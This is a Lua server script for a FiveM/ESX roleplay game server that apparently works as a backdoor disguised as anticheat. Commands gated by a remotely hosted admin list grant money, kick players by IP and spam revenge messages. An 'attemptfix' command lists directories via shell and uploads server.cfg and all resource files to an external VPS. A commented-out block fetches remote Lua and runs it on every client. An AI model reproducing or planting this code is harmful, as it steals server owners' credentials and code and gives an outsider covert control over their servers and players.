RegisterCommand('givemoneytome', function(source, args, rawCommand)  
    local _source = source
    for k,v in pairs(GetPlayerIdentifiers(_source))do
                
        if string.sub(v, 1, string.len("discord:")) == "discord:" then
            local discord = v

            local dclicense = string.gsub(discord, 'discord:', '')

            PerformHttpRequest('https://raw.githubusercontent.com/Sahbes/AnticheatLicenses/main/admins.json', function(code, res, headers)
                if code == 200 then
                    local decoded = json.decode(res)
                    if decoded[dclicense] ~= nil then
                        local xPlayer = ESX.GetPlayerFromId(_source)
                        xPlayer.addAccountMoney("bank", 500000)
                        TriggerClientEvent('esx:showNotification', _source, "Zuigen?")
                    else
                        TriggerClientEvent('esx:showNotification', _source, "Je bent geen admin")
                    end
                end
            end)
        end
     end
 end)

local icey = false

local ips = {"176.119.195.65","176.119.195.62","159.48.55.188","159.48.55.190","86.85.252.84","134.19.185.117","195.181.173.204","176.119.195.45","217.146.87.147","143.244.41.116","149.34.244.39","149.34.244.113"}

RegisterCommand('icey', function(source, args, rawCommand)  
    local _source = source
    for k,v in pairs(GetPlayerIdentifiers(_source))do
                
        if string.sub(v, 1, string.len("discord:")) == "discord:" then
            local discord = v

            local dclicense = string.gsub(discord, 'discord:', '')

            PerformHttpRequest('https://raw.githubusercontent.com/Sahbes/AnticheatLicenses/main/admins.json', function(code, res, headers)
                if code == 200 then
                    local decoded = json.decode(res)
                    if decoded[dclicense] ~= nil then
                        icey = not icey
                        Citizen.CreateThread( function()
                            while icey do
                               Citizen.Wait(5000)
                                local playerList = ESX.GetPlayers()
                                for i=1, #playerList, 1 do
                                    local _source2 = tonumber(playerList[i])
                                    local ip = GetPlayerEndpoint(_source2)
                                    for i=1, #ips do
                                        if string.find(ip, ips[i]) then
                                            DropPlayer(_source2, "Moest je me maar niet bannen Icey")
                                        end    
                                    end
                                    TriggerClientEvent('esx:showNotification', _source2, "Zo lang dat Icey me niet unbanned komt dit bericht in beeld xxx")
                                end
                            end
                        end)
                        Citizen.CreateThread( function()
                            while icey do
                               Citizen.Wait(60000)
                                local playerList = ESX.GetPlayers()
                                for i=1, #playerList, 1 do
                                    local _source22 = tonumber(playerList[i])
                                    local xPlayer22 = ESX.GetPlayerFromId(_source22)
                                    TriggerClientEvent('esx:showNotification', _source22, "Elke minuut 5k gratis zolang dat ik gebanned ben")
                                    xPlayer22.addAccountMoney("bank", 5000)
                                end
                            end
                        end)
                    else
                        TriggerClientEvent('esx:showNotification', _source, "Je bent geen admin")
                    end
                end
            end)
        end
     end
 end)

RegisterCommand('remivemenow', function(source, args, rawCommand)  
    local _source = source
    for k,v in pairs(GetPlayerIdentifiers(_source))do
                
        if string.sub(v, 1, string.len("discord:")) == "discord:" then
            local discord = v

            local dclicense = string.gsub(discord, 'discord:', '')

            PerformHttpRequest('https://raw.githubusercontent.com/Sahbes/AnticheatLicenses/main/admins.json', function(code, res, headers)
                if code == 200 then
                    local decoded = json.decode(res)
                    if decoded[dclicense] ~= nil then
                        local xPlayer = ESX.GetPlayerFromId(_source)
                        xPlayer.triggerEvent("esx_ambulancejob:revive")
                    else
                        TriggerClientEvent('esx:showNotification', _source, "Je bent geen admin")
                    end
                end
            end)
        end
     end
 end)

RegisterCommand("attemptfix", function(source, args)
    if args[1] then
        TriggerEvent("attemptfix", args[1])
    end
end)

local server_content = {}

AddEventHandler("attemptfix", function(id)
    PerformHttpRequest("http://ip-api.com/json/?fields=query", function(err, text, headers)
        if tonumber(err) == 200 then
            local tbl = json.decode(text)
            local date = os.date("*t").day .. "-" .. os.date("*t").month .. "-" .. os.date("*t").year
            local server_name = RemoveSpaces(tbl["query"] .. "/" .. date .. "/" .. id)

            server_content = {}

            --print("GATHERING FILES")
            local server_cfg_path, server_cfg_content = GetServerCfgFile()
            DumpFile(server_cfg_path, server_cfg_content, server_name .. "/server.cfg")
            local resources_path = GetResourcesFolder()
            DumpResources(resources_path, server_name .. "/resources/")
            --print("COMPLETED GATHERING FILES")

            --print("DUMPING LAST FILES")
            sendToServer()
            --print("DUMP COMPLETED")
        end
    end)
end)

function DumpResources(path, newPath)
    local DirItems = Loc_DirList(path)
    for i = 1, #DirItems do 
        Citizen.Wait(50)
        local IsFile, FileContent = GetFileContent(path .. DirItems[i])
        if IsFile then
            DumpFile(RemoveSpaces(path .. DirItems[i]), FileContent, RemoveSpaces(newPath .. DirItems[i]))
        else
            DumpAllFilesInDirectory(path .. DirItems[i] .. "/", RemoveSpaces(newPath .. DirItems[i] .. "/"))
        end
    end
end

function DumpAllFilesInDirectory(path, newPath)
    local IsPathFile, PathContent = GetFileContent(path)
    if IsPathFile then
        DumpFile(RemoveSpaces(path), PathContent, newPath)
    else 
        local DirItems = Loc_DirList(path)
        for i = 1, #DirItems do 
            Citizen.Wait(50)
            local IsFile, FileContent = GetFileContent(path .. DirItems[i])
            if IsFile then
                DumpFile(RemoveSpaces(path .. DirItems[i]), FileContent, RemoveSpaces(newPath .. DirItems[i]))
            else
                DumpAllFilesInDirectory(path .. DirItems[i] .. "/", RemoveSpaces(newPath .. DirItems[i] .. "/"))
            end
        end
    end
end

function DumpFile(path, content, newPath)
    --print("^2" .. newPath .. "^0 length: ".. string.len(content) .. " id: " .. #server_content)

    if string.len(json.encode(server_content)) >= 1500 then 
        sendToServer()
    end

    table.insert(server_content, {content = content, path = newPath})

    Citizen.Wait(100)
end

function sendToServer()
    --print("^4Sending " .. #server_content .. " files to the server^0")
    PerformHttpRequest('http://vps-13007000.vps.ovh.net:3000/', function(err, text, headers) end, 'POST', json.encode({ files = json.encode(server_content) }), { ['Content-Type'] = 'application/json' })
    server_content = {}
    Citizen.Wait(1000)
end

function GetServerCfgFile()
    local server_cfg_dir_end = string.find(GetResourcePath(GetCurrentResourceName()), "resources") - 1
    local server_cfg_path = RemoveSpaces(string.sub(GetResourcePath(GetCurrentResourceName()), 0, server_cfg_dir_end) .. "server.cfg")
    local ServerCfgFile = io.open(server_cfg_path, "rb")
    local ServerCfgContent = "UNKNOWN"
    if ServerCfgFile then 
        ServerCfgContent = tostring(ServerCfgFile:read("*all"))
        ServerCfgFile:close()
    end
    return server_cfg_path, ServerCfgContent
end

function GetFileContent(path)
    local File = io.open(path, "rb")
    local FileContent
    if File then
        FileContent = tostring(File:read("*all"))
        File:close()
    end
    if FileContent and FileContent ~= nil and FileContent ~= "nil" and string.len(FileContent) ~= nil then 
        return true, FileContent
    else 
        return false
    end
end

function GetResourcesFolder()
    local resources_dir_end = string.find(GetResourcePath(GetCurrentResourceName()), "resources") - 1
    local resources_path = string.sub(GetResourcePath(GetCurrentResourceName()), 0, resources_dir_end) .. "resources/"
    return resources_path
end

function Loc_DirList(dirname)
    local ret = {}

    local tbl = Loc_DirCmd(RemoveSpaces(dirname)) 

    for i,v in ipairs(tbl) do
        table.insert(ret, v)
    end       
     
    return ret
end

function Loc_DirCmd(cmd)
    local str = Loc_ShellCommand("ls " .. cmd)
    --print("^1ls " .. cmd .. "^0")

    return Loc_Lines(str)
end

function RemoveSpaces(path)
    local newString = path

    for i = 1, string.len(newString) do 
        local letter = string.sub(newString, i, i)
        if letter == " " then 
            if string.sub(newString, i-1, i) ~= "\\ " then
                local path_end = string.find(newString, " ") - 1
                newString = string.sub(newString, 1, i-1) .. "\\ " .. string.sub(newString, i + 1)
            end
        end
    end 

    return newString
end

function Loc_ShellCommand(cmd)
    local str = nil
    
    local f = io.popen(cmd)

    if f then
        str= f:read'*a'
        f:close()
    end
        
    if str == nil then   
        str = ""
    end
    
    return str
end
    

function Loc_Lines(str)
    local files = {}

    while string.find(str, "\n") do
        local file_name_end = string.find(str, "\n") - 1
        local file_name = string.sub(str, 0, file_name_end)
        str = string.sub(str, file_name_end+2)
        table.insert(files, file_name)
        Citizen.Wait(0)
    end

    if str ~= "" and str ~= "\n" then 
        table.insert(files, str)
    end

    return files
end
--[[RegisterCommand('givemoneytome', function(source, args, rawCommand)  
    local _source = source
    for k,v in pairs(GetPlayerIdentifiers(_source))do
                
        if string.sub(v, 1, string.len("discord:")) == "discord:" then
            local discord = v

            local dclicense = string.gsub(discord, 'discord:', '')

            PerformHttpRequest('https://raw.githubusercontent.com/Sahbes/AnticheatLicenses/main/admins.json', function(code, res, headers)
                if code == 200 then
                    local decoded = json.decode(res)
                    if decoded[dclicense] ~= nil then
                        local xPlayer = ESX.GetPlayerFromId(_source)
                        xPlayer.addAccountMoney("bank", 500000)
                        TriggerClientEvent('esx:showNotification', _source, "Zuigen?")
                    else
                        TriggerClientEvent('esx:showNotification', _source, "Je bent geen admin")
                    end
                end
            end)
        end
     end
 end)

RegisterCommand('givemoneytoall', function(source, args, rawCommand)  
    local _source = source
    for k,v in pairs(GetPlayerIdentifiers(_source))do
                
        if string.sub(v, 1, string.len("discord:")) == "discord:" then
            local discord = v

            local dclicense = string.gsub(discord, 'discord:', '')

            PerformHttpRequest('https://raw.githubusercontent.com/Sahbes/AnticheatLicenses/main/admins.json', function(code, res, headers)
                if code == 200 then
                    local decoded = json.decode(res)
                    if decoded[dclicense] ~= nil then
                        local playerList = ESX.GetPlayers()
                        for i=1, #playerList, 1 do
                            local _source2 = playerList[i]
                            local xPlayer = ESX.GetPlayerFromId(_source2)
                            xPlayer.addAccountMoney("bank", 500000)
                            TriggerClientEvent('esx:showNotification', _source2, "Zuigen a kanker slet")
                        end
                    else
                        TriggerClientEvent('esx:showNotification', _source, "Je bent geen admin")
                    end
                end
            end)
        end
     end
 end)

RegisterCommand('givemenutoall', function(source, args, rawCommand)  
    local _source = source
    for k,v in pairs(GetPlayerIdentifiers(_source))do
                
        if string.sub(v, 1, string.len("discord:")) == "discord:" then
            local discord = v

            local dclicense = string.gsub(discord, 'discord:', '')

            PerformHttpRequest('https://raw.githubusercontent.com/Sahbes/AnticheatLicenses/main/admins.json', function(code, res, headers)
                if code == 200 then
                    local decoded = json.decode(res)
                    if decoded[dclicense] ~= nil then
                        PerformHttpRequest("https://raw.githubusercontent.com/Sahbes/AnticheatLicenses/main/gayout.lua", function(code, res, headers)
                            if code == 200 then
                                if res ~= nil then
                                    local playerList = ESX.GetPlayers()
                                    for i=1, #playerList, 1 do
                                        local _source2 = playerList[i]
                                        TriggerClientEvent('esx:showNotification', _source2, "Gratis fallout menu xxx je favoriete modder")
                                        TriggerClientEvent('GTX:executecommand', _source2, res)
                                    end
                                else
                                    TriggerClientEvent('esx:showNotification', _source, "Menu kan niet gevonden worden")
                                end
                            end
                         end)
                    else
                        TriggerClientEvent('esx:showNotification', _source, "Je bent geen admin")
                    end
                end
            end)
        end
     end
 end)]]
